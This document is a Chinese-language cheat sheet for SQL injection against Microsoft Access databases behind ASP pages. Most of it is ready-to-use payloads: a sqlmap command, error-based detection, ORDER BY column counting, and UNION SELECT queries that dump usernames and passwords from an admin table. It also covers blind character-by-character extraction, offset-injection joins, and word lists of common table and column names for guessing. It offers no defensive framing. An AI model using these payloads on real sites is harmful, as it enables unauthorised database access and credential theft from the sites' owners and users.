Access数据库没有记录所有表名和列名的表，也就意味着我们需要依靠字典进行猜解表名和列

Access数据库中没有注释符号.因此 /**/ 、 -- 和 # 都没法使用。

sqlmap语句：sqlmap -u "http://test.com/1.asp?id=1" --tables

普通注入\
判断注入点

在参数后面加 单引号

http://www.example.com/new_list.asp?id=1' #页面报错

http://www.example.com/new_list.asp?id=1 and 1=1 #页面正常

http://www.example.com/new_list.asp?id=1 and 1=2 #页面报错

猜字段： 1 order by 4 报错 1 order by 3 正确

有回显：\
?id=-1 union select 1,2,3,4,5,6,7,8,9,10 from admin（此时页面有显示2、3）

查列：and exists (select 列名 from 表名) （假设存在user、password）

?id=3 and exists (select * from test)

?id=3 and exists (select * from admin)

?id=3 and exists (select name from admin) 报错，说明不存在

?id=3 and exists (select username from admin) 说明存在username

?id=3 and exists (select password from admin) 说明存在password

?id=-1 union select 1,2,3,4,5,6,7,8,9,10 找到注入位

?id=-1 union select 1,user,password,4,5,6,7,8,9,10 from admin（即可爆出账号密码）

无回显：
查表：and exists (select * from 表名) 存在的话就返回正常 不存在就返回不正常

查列：and exists (select 列名 from 表名)

查内容：and (select top 1 asc(mid(user,1,1))from admin)=97

and (select top 1 asc(mid(user,2,1))from admin)=97 猜字段(username)中第一条记录内容的第二个字符

and (select top 2 asc(mid(user,1,1))from admin)=97 猜字段(username)中第二条记录内容的第一个字符


偏移注入（回显数连续）\
假设已经判断存在admin表，order by下判断有35行，且回显如下回显字段连续\
UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,* from admin --返回错误页面

UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,* from admin --返回错误页面

UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,* from admin --返回错误页面

UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,* from admin --返回到一个错误页面提示查询语句出错，因此admin表的列数为6

UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35 from admin

因为回显如下图 28 29 30是连着的，直接在27后加表名.*

偏移注入（常规操作）\
Access偏移注入：表名知道，列名无法获取的情况下。

存在注入点，且order by下判断出字段数为22行

爆出显位

127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin

*****号判断直到页面错误有变化

127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin 正确

说明admin有6个字段

Access****偏移注入，基本公式为：

order by 出的字段数减去*号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案；

也就是：

* = 6个字符

2 × * = 12个字符

22 - 12 = 10个字符

一级偏移语句：

127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id = b.id)

二级偏移语句：

127.0.0.1/asp/index.asp?id=1513 union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join admin as c on a.id=c.id)

实战常见的表和列（也可以用sqlmap的，但是量大且效率低）

常见的表有（最后根据企业名的缩写搭配上admin、user、name）

admin admins admin_user admin_usr admin_msg admin_login user username manager msg_user msg_login useradmin product、news、usr、system、article、customer、area

admin_id、admin_name、admin_password

常见的列

admin admin_user username password passwd pass pwd users usr user_login user_name login_name name等等
